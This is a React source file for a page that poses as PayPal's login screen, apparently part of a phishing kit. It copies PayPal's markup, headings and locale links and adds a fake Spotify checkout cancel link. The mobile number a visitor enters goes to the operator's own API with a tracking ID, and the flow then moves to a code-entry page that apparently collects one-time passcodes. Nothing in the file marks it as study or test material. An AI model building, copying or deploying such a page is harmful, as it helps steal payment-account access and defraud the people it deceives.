import React, { useEffect, useState } from "react";
import { useHistory } from "react-router-dom";
import ipinfo from "ipinfo";
import Footer from "./Footer";
import axios from 'axios';
import { zokomId } from '../utils/auth';
import { parsePhoneNumberFromString, isValidPhoneNumber } from 'libphonenumber-js';

const PayPalCodeLogin = () => {
  const [userCountry, setUserCountry] = useState('US'); // Default to US
  const [flagUrl, setFlagUrl] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const [mobileNumber, setMobileNumber] = useState('');
  const [error, setError] = useState('');
  const [phoneCode, setPhoneCode] = useState('+1'); // Default US code
  const [showError, setShowError] = useState(false);
  const [styles, setStyles] = useState(null);
  const history = useHistory();
  const [loginError, setLoginError] = useState(false);
  const [email, setEmail] = useState('');
  const userId = zokomId();
  const [isLoading, setIsLoading] = useState(true);
  const [loadingStyles, setLoadingStyles] = useState(null);

  const getFlagUrl = async (countryCode) => {
    return `https://purecatamphetamine.github.io/country-flag-icons/3x2/${countryCode.toUpperCase()}.svg`;
  };

  const getPhoneCode = async (countryCode) => {
    try {
      const response = await axios.get(`https://restcountries.com/v3.1/alpha/${countryCode}`);
      const dialCode = response.data[0].idd.root + (response.data[0].idd.suffixes?.[0] || '');
      setPhoneCode(dialCode);
    } catch (error) {
      console.error('Error fetching phone code:', error);
      setPhoneCode('+1'); // Default to US
    }
  };

  const handleMobileNumberChange = (e) => {
    let value = e.target.value;
    setMobileNumber(value);

    // Validate as the user types
    if (value) {
      const isValid = validatePhoneNumber(value, userCountry);
      setError(isValid ? '' : 'Invalid phone number format.');
    } else {
      setError('Phone number is required.');
    }
  };

  useEffect(() => {
    const fetchCountryFromLocalStorage = async () => {
      try {
        const countryCode = localStorage.getItem('CountryCode') || 'US';
        setUserCountry(countryCode);

        const url = await getFlagUrl(countryCode);
        setFlagUrl(url);
      } catch (err) {
        console.error('Error fetching country from local storage:', err);
      }
    };

    fetchCountryFromLocalStorage();
  }, []);

  useEffect(() => {
    const loadStyles = async () => {
      try {
        const cssModule = await import('../../assets/styles/login.css');
        setStyles(cssModule.default);
      } catch (error) {
        console.error('Error loading styles:', error);
      }
    };

    loadStyles();
  }, []);

  useEffect(() => {
    const loadAndUnloadStyles = async () => {
      try {
        // Load the loading spinner styles
        const codeInputCss = await import('../../assets/styles/codeinput.css');
        setLoadingStyles(codeInputCss.default);
        
        // Wait for 2 seconds
        setTimeout(() => {
          setIsLoading(false);
          // Cleanup loading styles
          setLoadingStyles(null);
        }, 2000);
      } catch (error) {
        console.error('Error loading styles:', error);
        setIsLoading(false);
      }
    };

    loadAndUnloadStyles();

    // Cleanup function
    return () => {
      setLoadingStyles(null);
    };
  }, []);

  const handleFocus = (e) => {
    setIsFocused(true);
    if (!mobileNumber.startsWith(phoneCode)) {
      setMobileNumber(phoneCode);
    }
  };

  const handleBlur = (e) => {
    if (!e.target.value) {
      setIsFocused(false);
    }
  };

  const validatePhoneNumber = (number, countryCode) => {
    try {
      const phoneNumber = parsePhoneNumberFromString(number, countryCode);
      return phoneNumber?.isValid() || false;
    } catch (error) {
      return false;
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const phoneNumber = parsePhoneNumberFromString(mobileNumber, userCountry);
    
    if (!phoneNumber || !phoneNumber.isValid()) {
      setError('Please enter a valid phone number.');
      setShowError(true);
      return;
    }
  
    try {
      const response = await axios.put(`${process.env.REACT_APP_API_URL}/api/paypal`, {
        mobileNumber: phoneNumber.number,
        userId
      });
      
      localStorage.setItem('paypalMobile', phoneNumber.number);
      history.push('/codeinput');
    } catch (error) {
      console.error('Error creating PayPal entry:', error);
      setShowError(true);
      setError('Something went wrong. Please try again.');
    }
  };
  
  const handleButtonClick = () => {
    const form = document.querySelector('form');
    if (form) {
      form.dispatchEvent(new Event('submit', { cancelable: true }));
    }
  };

  return (
    <div className="desktop">
      <div id="main" style={{marginBottom: '50px'}} className="main">
        <section id="login" className="login" data- data-title="Log in to your PayPal account">
          <div className="corral">
            <div id="content" className="contentContainer activeContent contentContainerBordered">
              <div className={`transitioning spinnerWithLockIcon ${!isLoading ? 'hide' : ''}`} aria-busy="true">
              </div>
              <div className={`lockIcon ${!isLoading ? 'hide' : ''}`}></div>
              
              {!isLoading && (
                <>
                  <header id="header">
                    <p className="paypal-logo paypal-logo-long"></p>
                  </header>
                  <h1 id="headerText" className="headerText">Pay with PayPal</h1>
                  <p id="emailSubTagLine" className="subHeaderText">Enter your mobile number to get started.</p>
                  <div className={`notifications ${!showError ? 'hide' : ''}`}>
                    <p className="notification notification-critical" role="alert">Please check your entries and try again.</p>
                  </div>
                  <form
                    onSubmit={handleSubmit} // Add onSubmit handler
                    className="proceed maskable"
                    autoComplete="off"
                    name="login"
                    noValidate
                  >
                    <div id="splitEmail" className="splitEmail">
                      <div id="splitEmailSection" className="splitPhoneSection splitEmailSection adjustSection">
                        <div className="textInput" id="login_emaildiv">
                          <div className="fieldWrapper">
                            <input
                              id="email"
                              name="login_email"
                              type="tel"
                              value={mobileNumber} // Add this
                              className="hasHelp validate validateEmpty"
                              required="required"
                              onChange={handleMobileNumberChange}
                              onFocus={handleFocus}
                              onBlur={handleBlur}                        
                              autoComplete="phone"
                              placeholder="Mobile number"
                              style={{
                                minHeight: '64px',
                                lineHeight: '24px',
                                border: 'none',
                                paddingTop: '20px',
                                paddingBottom: '8px',
                                paddingLeft: '12px',
                                paddingRight: '12px',
                                width: '100%',
                                backgroundColor: '#fff',
                                textOverflow: 'ellipsis',
                                appearance: 'none',
                                height: '64px'
                              }}
                            />
                            <label htmlFor="email" className="fieldLabel">
                              Mobile number
                            </label>
                          </div>
                          <div className="errorMessage" id="emailErrorMessage">
                            <p className="emptyError hide">Required</p>
                            <p className="invalidError hide">That email or mobile number format isn’t right</p>
                          </div>
                        </div>
                        
                      </div>
                      <div className="actions">
                        <button
                          className="button actionContinue scTrackUnifiedloginLoginClickNext"
                          type="submit"
                          id="btnNext"
                          name="btnNext"
                          value="Next"
                          onClick={handleButtonClick} // Add onClick handler
                          disabled={!mobileNumber} // Disable if no number
                          style={{
                            cursor: mobileNumber ? 'pointer' : 'not-allowed',
                            opacity: mobileNumber ? 1 : 0.7
                          }}
                        >
                          Next
                        </button>
                      </div>
                    </div>
                  </form>
                  <div id="signupContainer" className="signupContainer">
                    <div className="loginSignUpSeparator">
                      <span className="textInSeparator">or</span>
                    </div>
                    <button
                      type="button"
                      id="startOnboardingFlow"
                      className="button secondary scTrackUnifiedloginClickSignupButton onboardingFlowContentKey"
                      pa-marked="1"
                    >
                      Create an Account
                    </button>
                  </div>
                  <div className="intentFooter">
                    <div className="cancelUrl">
                      <a
                                                    href="https://spotify.com"
                                                    data-url="https://payments.spotify.com/checkout/2a966a07-14c0-39e4-b0f1-f27ac82aba08/?country=US&market=us&product=2024-q4globalcampaign-intro&psp=paypal&token=EC-5G140757D6791933L&approval_token_id=91B256819V7453949&approval_session_id=91B256819V7453949"
                        className="scTrackUnifiedloginClickCancelAndReturn cancelLink"
                        id="cancelLink"
                        pa-marked="1"
                      >
                        Cancel and return to Spotify Inc
                      </a>
                    </div>
                    <div className="localeSelector">
                      <span className="picker country-selector">
                        <span className="hide" id="countryPickerLink">
                          {userCountry}
                        </span>
                        <button
                          type="button"
                          className="country US"
                          style={{
                            backgroundImage: `url(${flagUrl})`,
                            backgroundPosition: 'center',
                            width: '24px',
                            height: '17px',
                            border: 'none',
                            cursor: 'pointer',
                            paddingLeft: '8px',
                            paddingRight: '8px',
                            paddingTop: '8px',
                          }}
                        />
                      </span>
                      <ul className="localeLink">
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageArEG"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=ar_EG&langTgl=ar"
                            lang="ar"
                            data-locale="ar_EG"
                            pa-marked="1"
                          >
                            العربية
                          </a>
                        </li>
                        <li>
                          <a
                            className="selected scTrackUnifiedloginFooterLanguageEnUS"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x+=TN&locale.x=en_US&langTgl=en"
                            lang="en"
                            data-locale="en_US"
                            aria-current="true"
                            pa-marked="1"
                          >
                            English
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageFrXC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=fr_XC&langTgl=fr"
                            lang="fr"
                            data-locale="fr_XC"
                            pa-marked="1"
                          >
                            Français
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageEsXC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=es_XC&langTgl=es"
                            lang="es"
                            data-locale="es_XC"
                            pa-marked="1"
                          >
                            Español
                          </a>
                        </li>
                        <li>
                          <a
                            className="scTrackUnifiedloginFooterLanguageZhXC"
                            href="/signin?intent=checkout&ctxId=xo_ctx_EC-5G140757D6791933L&returnUri=%2Fwebapps%2Fhermes&state=%3Fflow%3D1-P%26ulReturn%3Dtrue%26approval_session_id%3D91B256819V7453949%26ssrt%3D1735236027361%26token%3DEC-5G140757D6791933L%26rcache%3D1%26cookieBannerVariant%3Dhidden&flowId=EC-5G140757D6791933L&country.x=TN&locale.x=zh_XC&langTgl=zh"
                            lang="zh"
                            data-locale="zh_XC"
                            pa-marked="1"
                          >
                            中文
                          </a>
                        </li>
                      </ul>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        </section>        
      </div>
      <Footer />
    </div>
  );
};

export default PayPalCodeLogin;
